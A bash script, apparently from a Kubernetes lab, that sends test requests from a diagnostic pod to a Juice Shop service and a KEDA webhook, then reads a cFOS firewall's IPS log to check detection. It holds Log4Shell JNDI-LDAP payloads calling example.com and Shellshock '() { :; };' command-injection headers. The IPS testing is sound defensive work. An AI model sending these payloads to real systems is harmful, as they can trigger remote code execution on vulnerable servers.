#!/bin/bash

# Function to run curl command inside the pod
run_curl_in_pod() {
    # Parameters
    LOCAL_CURL_COMMAND=$1
    JUICE_SHOP_SVC=$2

    # Get the pod name with label app=diag
    POD_NAME=$(kubectl get pods -l app=diag -o jsonpath='{.items[0].metadata.name}')
    
    if [ -z "$POD_NAME" ]; then
        echo "No pod found with label app=diag"
        exit 1
    fi

    # Run the curl command inside the pod
    echo kubectl exec $POD_NAME -- bash -c "$LOCAL_CURL_COMMAND $JUICE_SHOP_SVC"
    echo waiting result
    kubectl exec $POD_NAME -- bash -c "$LOCAL_CURL_COMMAND $JUICE_SHOP_SVC"
    sleep 2
    echo display log on cfos
}

# Define the Juice Shop service address in a variable
service_address="http://juiceshop-service.security.svc.cluster.local:3000/api/Products"
cfos_pod_name=$(kubectl get pods -l app=firewall -o jsonpath='{.items[0].metadata.name}')

payload='curl -s --max-time 5 -H "User-Agent: \${jndi:ldap://example.com/a}"'
run_curl_in_pod "$payload" "$service_address"
kubectl exec -it po/${cfos_pod_name} -c cfos -- tail -n -1 /var/log/log/ips.0

payload='curl -s --max-time 5 -H "User-Agent: {jndi:ldap://example.com/a}"'
run_curl_in_pod "$payload" "$service_address"
kubectl exec -it po/${cfos_pod_name} -c cfos -- tail -n -1 /var/log/log/ips.0

sleep 5
payload='curl -s --max-time 5 -H "User-Agent: () { :; }; /bin/ls"'
run_curl_in_pod "$payload" "$service_address"
kubectl exec -it po/${cfos_pod_name} -c cfos -- tail -n -1 /var/log/log/ips.0

service_address="https://keda-admission-webhooks.keda.svc.cluster.local:443/"
payload='curl -k -s --max-time 5 -H "User-Agent: () { :; }; /bin/ls"'
run_curl_in_pod "$payload" "$service_address"
kubectl exec -it po/${cfos_pod_name} -c cfos -- tail -n -1 /var/log/log/ips.0
